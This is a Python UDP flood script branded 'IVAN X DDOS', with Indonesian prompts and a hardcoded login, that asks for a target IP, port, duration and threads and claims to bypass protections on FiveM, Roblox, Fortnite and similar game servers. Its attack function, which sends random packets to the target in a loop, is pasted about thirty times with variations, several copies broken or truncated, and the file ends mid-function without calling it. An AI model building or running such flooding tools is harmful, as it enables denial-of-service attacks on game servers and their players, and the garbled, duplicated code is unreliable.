import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m	

▒███████▒▓█████  ███▄    █ ██▒   █▓ ██▓ ██▓      ▄████  ▒█████   ██▓    ▓█████▄  ██▓  ▄████   ▄████ ▓█████  ██▀███  
▒ ▒ ▒ ▄▀░▓█   ▀  ██ ▀█   █▓██░   █▒▓██▒▓██▒     ██▒ ▀█▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
░ ▒ ▄▀▒░ ▒███   ▓██  ▀█ ██▒▓██  █▒░▒██▒▒██░    ▒██░▄▄▄░▒██░  ██▒▒██░    ░██   █▌▒██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
  ▄▀▒   ░▒▓█  ▄ ▓██▒  ▐▌██▒ ▒██ █░░░██░▒██░    ░▓█  ██▓▒██   ██░▒██░    ░▓█▄   ▌░██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
▒███████▒░▒████▒▒██░   ▓██░  ▒▀█░  ░██░░██████▒░▒▓███▀▒░ ████▓▒░░██████▒░▒████▓ ░██░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒   ░ ▐░  ░▓  ░ ▒░▓  ░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░▓   ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░░▒ ▒ ░ ▒ ░ ░  ░░ ░░   ░ ▒░  ░ ░░   ▒ ░░ ░ ▒  ░  ░   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ▒ ░  ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
░ ░ ░ ░ ░   ░      ░   ░ ░     ░░   ▒ ░  ░ ░   ░ ░   ░ ░ ░ ░ ▒    ░ ░    ░ ░  ░  ▒ ░░ ░   ░ ░ ░   ░    ░     ░░   ░ 
  ░ ░       ░  ░         ░      ░   ░      ░  ░      ░     ░ ░      ░  ░   ░     ░        ░       ░    ░  ░   ░     
░                              ░                                         ░                                          
                   
""")

username = str(input("\033[94m[GOG-ZenvilGoldigger] \033[93mEnter Name Username:"))
password = str(input("\033[94m[GOG-ZenvilGoldigger] \033[93mEnter Name Password:"))
if password == "IvanDDoS" and username == "IvanDDoS":
    print ("Selamat Kamu Berhasil Memasukan Password")
    time.sleep(2)

else:
    print ("Kamu Salah Memasukan Password Silakan Login/Keluar Kembali")
    time.sleep(2)
    exit()

os.system("clear")

print("""\033[93m

▒███████▒▓█████  ███▄    █ ██▒   █▓ ██▓ ██▓      ▄████  ▒█████   ██▓    ▓█████▄  ██▓  ▄████   ▄████ ▓█████  ██▀███  
▒ ▒ ▒ ▄▀░▓█   ▀  ██ ▀█   █▓██░   █▒▓██▒▓██▒     ██▒ ▀█▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
░ ▒ ▄▀▒░ ▒███   ▓██  ▀█ ██▒▓██  █▒░▒██▒▒██░    ▒██░▄▄▄░▒██░  ██▒▒██░    ░██   █▌▒██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
  ▄▀▒   ░▒▓█  ▄ ▓██▒  ▐▌██▒ ▒██ █░░░██░▒██░    ░▓█  ██▓▒██   ██░▒██░    ░▓█▄   ▌░██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
▒███████▒░▒████▒▒██░   ▓██░  ▒▀█░  ░██░░██████▒░▒▓███▀▒░ ████▓▒░░██████▒░▒████▓ ░██░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒   ░ ▐░  ░▓  ░ ▒░▓  ░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░▓   ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░░▒ ▒ ░ ▒ ░ ░  ░░ ░░   ░ ▒░  ░ ░░   ▒ ░░ ░ ▒  ░  ░   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ▒ ░  ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
░ ░ ░ ░ ░   ░      ░   ░ ░     ░░   ▒ ░  ░ ░   ░ ░   ░ ░ ░ ░ ▒    ░ ░    ░ ░  ░  ▒ ░░ ░   ░ ░ ░   ░    ░     ░░   ░ 
  ░ ░       ░  ░         ░      ░   ░      ░  ░      ░     ░ ░      ░  ░   ░     ░        ░       ░    ░  ░   ░     
░                              ░                                         ░                                          
                   
\033[91m   [ Source :  IVAN X DDOS ]
\033[91m   [ Basic Tools :  Udp-Flood And Tcp-Flood ]
\033[91m   [ Developer Tools : AKA-IVANDDOS ]
\033[91m   [ Methode : BYPASS FIVEM/GTPS/ROBLOX/FORTNITE/SAMP ]
\033[91m   [ Ping Tools :  Tergantung Dari Packetnya  ]
""")

ip = str(input("\033[94m====> Enter The IP/Host Target   : "))
port = int(input("\033[94m====> Enter The PORT Target   : "))
time = int(input("\033[94m====> How Much You Sent Enter Time   : "))
threads = int(input("\033[94m====> How Much You Sent Threads   : "))

os.system("clear")

brand = """\033[95m

▒███████▒▓█████  ███▄    █ ██▒   █▓ ██▓ ██▓      ▄████  ▒█████   ██▓    ▓█████▄  ██▓  ▄████   ▄████ ▓█████  ██▀███  
▒ ▒ ▒ ▄▀░▓█   ▀  ██ ▀█   █▓██░   █▒▓██▒▓██▒     ██▒ ▀█▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
░ ▒ ▄▀▒░ ▒███   ▓██  ▀█ ██▒▓██  █▒░▒██▒▒██░    ▒██░▄▄▄░▒██░  ██▒▒██░    ░██   █▌▒██▒▒██░▄▄▄░▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
  ▄▀▒   ░▒▓█  ▄ ▓██▒  ▐▌██▒ ▒██ █░░░██░▒██░    ░▓█  ██▓▒██   ██░▒██░    ░▓█▄   ▌░██░░▓█  ██▓░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
▒███████▒░▒████▒▒██░   ▓██░  ▒▀█░  ░██░░██████▒░▒▓███▀▒░ ████▓▒░░██████▒░▒████▓ ░██░░▒▓███▀▒░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒   ░ ▐░  ░▓  ░ ▒░▓  ░ ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░▓   ░▒   ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
░░▒ ▒ ░ ▒ ░ ░  ░░ ░░   ░ ▒░  ░ ░░   ▒ ░░ ░ ▒  ░  ░   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ▒ ░  ░   ░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
░ ░ ░ ░ ░   ░      ░   ░ ░     ░░   ▒ ░  ░ ░   ░ ░   ░ ░ ░ ░ ▒    ░ ░    ░ ░  ░  ▒ ░░ ░   ░ ░ ░   ░    ░     ░░   ░ 
  ░ ░       ░  ░         ░      ░   ░      ░  ░      ░     ░ ░      ░  ░   ░     ░        ░       ░    ░  ░   ░     
░                              ░                                         ░                                          

\033[91m   [ Source :  IVAN X DDOS ]
\033[91m   [ Basic Tools :  Udp-Flood And Tcp-Flood ]
\033[91m   [ Developer Tools : AKA-IVANDDOS ]
\033[91m   [ Methode : BYPASS FIVEM/GTPS/ROBLOX/FORTNITE/SAMP ]
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

